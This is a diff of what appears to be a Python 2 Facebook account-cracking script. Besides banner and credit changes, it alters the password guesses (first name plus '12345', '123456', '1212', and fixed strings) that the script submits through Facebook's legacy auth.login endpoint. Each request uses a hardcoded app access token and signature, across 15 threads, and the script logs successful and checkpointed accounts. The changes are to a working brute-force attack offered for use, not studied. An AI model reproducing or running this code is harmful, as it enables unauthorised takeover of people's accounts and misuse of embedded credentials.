@@ -54,13 +54,12 @@ def cetak(b):
 logo = """
 
 
-
-███████╗░█████╗░███╗░░░███╗░█████╗░
-╚════██║██╔══██╗████╗░████║██╔══██╗
-░░░░██╔╝███████║██╔████╔██║███████║
-░░░██╔╝░██╔══██║██║╚██╔╝██║██╔══██║
-░░██╔╝░░██║░░██║██║░╚═╝░██║██║░░██║
-░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝
+░██████╗██╗░░██╗███████╗██╗░░██╗
+██╔════╝██║░░██║██╔════╝╚██╗██╔╝
+╚█████╗░███████║█████╗░░░╚███╔╝░
+░╚═══██╗██╔══██║██╔══╝░░░██╔██╗░
+██████╔╝██║░░██║███████╗██╔╝╚██╗
+╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
                                                   
 
 
@@ -85,12 +84,12 @@ os.system("clear")
 RH = """
 
 \033[1;91m
-███████╗░█████╗░███╗░░░███╗░█████╗░
-╚════██║██╔══██╗████╗░████║██╔══██╗
-░░░░██╔╝███████║██╔████╔██║███████║
-░░░██╔╝░██╔══██║██║╚██╔╝██║██╔══██║
-░░██╔╝░░██║░░██║██║░╚═╝░██║██║░░██║
-░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝  ╚═╝╚═╝  ╚═╝
+░██████╗██╗░░██╗███████╗██╗░░██╗
+██╔════╝██║░░██║██╔════╝╚██╗██╔╝
+╚█████╗░███████║█████╗░░░╚███╔╝░
+░╚═══██╗██╔══██║██╔══╝░░░██╔██╗░
+██████╔╝██║░░██║███████╗██╔╝╚██╗
+╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
                                                   
 
 """
@@ -339,7 +338,7 @@ def startgrab():
 				    cek.close()
 				    cekpoint.append(user+pass1)
                                 else:
-				    pass2 = first+"123123"									
+				    pass2 = first+"12345"									
                                     data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			            q = json.load(data)												
 			            if 'access_token' in q:
@@ -361,7 +360,7 @@ def startgrab():
 				               cek.close()
 				               cekpoint.append(user+pass2)								
 				           else:											
-					       pass3 = first+"12345"								
+					       pass3 = first+"123456"								
 					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
 					       q = json.load(data)										
 					       if 'access_token' in q:
@@ -427,7 +426,7 @@ def startgrab():
 				                                                   cek.close()
 				                                                   cekpoint.append(user+pass5)					
 						                               else:								
-							                           pass6 = '123456654321'											
+							                           pass6 = '12344321'											
 			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                           q = json.load(data)												
 			                                                           if 'access_token' in q:
@@ -449,7 +448,7 @@ def startgrab():
 				                                                               cek.close()
 				                                                               cekpoint.append(user+pass6)	
 						                                           else:							
-								                               pass7 = '12345677654321'			
+								                               pass7 = '1234556789987654321'			
 								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
 								                               q = json.load(data)						
 								                               if 'access_token' in q:
@@ -471,7 +470,7 @@ def startgrab():
 				                                                                           cek.close()
 				                                                                           cekpoint.append(user+pass7)           					
 								                                       else:						
-										                           pass8 ='1212'											
+										                           pass8 ='11223344'											
 			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                                                   q = json.load(data)												
 			                                                                                   if 'access_token' in q:
@@ -515,7 +514,7 @@ def startgrab():
 				                                                                                                   cek.close()
       				                                                                                                   cekpoint.append(user+pass9)
                 	 		                                                                                       else:
-																   pass10 = first+"123456"
+																   pass10 = first+"1212"
 																   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																   q = json.load(data)
 																   if 'access_token' in q:
@@ -541,7 +540,7 @@ def startgrab():
 		
 	p = ThreadPool(15)
 	p.map(main, id)
-        anime("\x1b[37;1m<<<<<<<<<<<<<<<\@7ama_software/>>>>>>>>>>>>>>>>\x1b[0m")
+        anime("\x1b[37;1m<<<<<<<<<<<<<<<\@SHEX__CRACKER/>>>>>>>>>>>>>>>>\x1b[0m")
         print(" ")
 	print('\x1b[32;1m[ ✓ ] CRACKING END'+"\x1b[0m")
 	print("\x1b[37;1mREsult \x1b[32;1mOKS/\x1b[31;1mCHECKPOINT\x1b[37;1m: \x1b[32;1m"+str(len(oks))+"\x1b[37;1m/"+"\x1b[31;1m"+str(len(cekpoint)))
